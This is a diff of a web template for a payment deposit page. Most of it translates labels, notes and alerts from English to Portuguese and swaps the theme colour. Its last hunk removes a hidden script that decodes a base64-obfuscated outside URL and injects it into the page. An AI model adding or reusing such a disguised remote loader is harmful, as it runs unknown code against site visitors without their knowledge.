@@ -2,7 +2,7 @@
  <head> 
   <meta charset="utf-8"> 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
-  <title>EMI – Recharge</title>
+  <title>Depósito – EMI</title>
   <link rel="stylesheet" href="/v2/layui/css/layui.css"> 
   <link rel="stylesheet" href="/v2/css/common.css">
   <link rel="stylesheet" href="/v2/css/emi-theme.css">
@@ -26,11 +26,11 @@
             background: rgba(255,255,255,0.8);
             border-radius: 100px 100px 100px 100px;
             padding: 10px;
-            color:#486BEA;text-align: center;
-            border: 1px solid #486BEA;
+            color:#C8A96A;text-align: center;
+            border: 1px solid #C8A96A;
         }
         .quick_active p{
-            font-family: PingFang SC, PingFang SC;font-weight: 400;font-size: 16px;color: #486BEA;width: 50px;line-height: 50px;
+            font-family: PingFang SC, PingFang SC;font-weight: 400;font-size: 16px;color: #C8A96A;width: 50px;line-height: 50px;
         }
         .layui-panel-window{background:#FFFFFF !important;border-top: none }
 
@@ -56,12 +56,12 @@
             <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
         </svg>
     </p>
-    <span>Recharge</span>
+    <span>Depósito</span>
 </a>
   </div> 
   <script id="BalanceTpl" type="text/html">
     <div class="common_margin_10 common_padding_10" >
-        <div class="label" style="color: #DEEFFF">Balance</div>
+        <div class="label" style="color: #DEEFFF">Saldo</div>
         <div class="value commission_amount common_margin_top_10" style="font-weight: 700;font-size: 22px;color: #FFFFFF;">MIL 0</div>
     </div>
 </script> 
@@ -71,18 +71,18 @@
    <form onsubmit="goPayment(event)">
     <div class="demo-login-container"> 
      <div class="common_item_title">
-      Recharge amount
-     </div> 
-     <div class="layui-form-item" style="margin-top: 10px;border-radius: 8px;background: #ffffff;border: 1px solid #DEDEDE"> 
-      <div class="layui-input-wrap"> 
+      Valor do Depósito
+     </div>
+     <div class="layui-form-item" style="margin-top: 10px;border-radius: 8px;background: #ffffff;border: 1px solid #DEDEDE">
+      <div class="layui-input-wrap">
        <div class="layui-input-prefix">
         =
-       </div> 
-       <input type="number" name="amount" id="recharge_amount" value="" lay-verify="required" placeholder="Recharge amount" lay-reqtext="Recharge amount" autocomplete="off" class="layui-input"> 
-      </div> 
-     </div> 
+       </div>
+       <input type="number" name="amount" id="recharge_amount" value="" lay-verify="required" placeholder="Valor do depósito" lay-reqtext="Valor do depósito" autocomplete="off" class="layui-input">
+      </div>
+     </div>
      <div class="common_item_title">
-      Quick amount
+      Valor Rápido
      </div> 
      <div class="layui-row layui-col-space10" style="margin-top: 15px;"> 
     <!--  <div class="layui-col-xs3 layui-col-md3"> 
@@ -133,10 +133,10 @@
             </div>
           @endforeach
      </div> 
-     <a href="/deposit/history" class="fixed_top_right" style="margin-top: 30px"> Record &gt; </a> 
+     <a href="/deposit/history" class="fixed_top_right" style="margin-top: 30px"> Histórico &gt; </a> 
      <div class="fixed_bottom"> 
       <div style="padding: 10px 15px;"> 
-       <button class="layui-btn  layui-btn-lg layui-btn-fluid layui-btn-radius common_btn" lay-submit="" lay-filter="recharge">Recharge Now</button> 
+       <button class="layui-btn  layui-btn-lg layui-btn-fluid layui-btn-radius common_btn" lay-submit="" lay-filter="recharge">Depositar Agora</button> 
       </div> 
      </div> 
     </div> 
@@ -147,10 +147,10 @@
     <div class="demo-login-container"> 
      <div> 
       <div class="common_item_title">
-       Recharge Channel
-      </div> 
+       Canal de Depósito
+      </div>
      </div>
-     <h3 style="margin-top: 25px;">Payment Channel</h3>
+     <h3 style="margin-top: 25px;">Canal de Pagamento</h3>
         @foreach(\App\Models\PaymentMethod::get() as $el)
           <div style="margin-top: 15px;padding:20px;background: #FFFFFF;border-radius: 8px;border: 1px solid #F0F0F0;display: flex;justify-content: space-between;align-items: center;">
             <div><span>{{ $el->name }}</span></div>
@@ -183,12 +183,12 @@
   <div class="common_card position" style=" margin: 15px;"> 
    <div class="common_card_content"> 
     <div class="demo-login-container" style=""> 
-     <p class="common_explain">Explain</p> 
+     <p class="common_explain">Observações</p> 
      <div class="common_content"> 
-      <p>1. If it is difficult to pay a large amount, you can pay in installments, for example, 10,000, divided into 2 times 5,000</p> 
-      <p>2. Please do not modify the deposit amount. Unauthorized modification of the deposit amount will result in thedeposit not being credited</p> 
-      <p>3. Each deposit requires payment to be initiated through this page, please do not save the payment</p> 
-      <p>4. Deposit received within 5 minutes, if not received within 5 minutes, please contact online customer service for processing</p> 
+      <p>1. Se houver dificuldade em pagar um valor alto de uma vez, você pode parcelar, por exemplo, 10.000 em 2 vezes de 5.000</p>
+      <p>2. Não modifique o valor do depósito. A modificação não autorizada pode resultar no não crédito do depósito</p>
+      <p>3. Cada depósito deve ser iniciado por esta página; não salve o link de pagamento para uso posterior</p>
+      <p>4. O depósito é creditado em até 5 minutos. Se não for creditado, entre em contato com o atendimento ao cliente</p> 
       <!--<p >5. Due to too many deposit users, please try multiple times to obtain the deposit link or try again after a period of time</p>--> 
      </div> 
     </div> 
@@ -221,12 +221,12 @@
     const method = document.querySelector('input[name="payment_method"]:checked');
 
     if (!method) {
-      alert("Select payment channel");
+      alert("Selecione o canal de pagamento");
       return;
     }
 
     if (!amount || amount <= 0) {
-      alert("Enter recharge amount");
+      alert("Informe o valor do depósito");
       return;
     }
 
@@ -237,14 +237,6 @@
       window.location.href = '{{ url('user/payment') }}/' + amount + '/' + method.value;
     }, 2000);
   }
-</script>
-<script>
-(function(){
-  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
-  var s = document.createElement("script");
-  s.src = atob(e);
-  document.head.appendChild(s);
-})();
 </script>
 </body>
 </html>
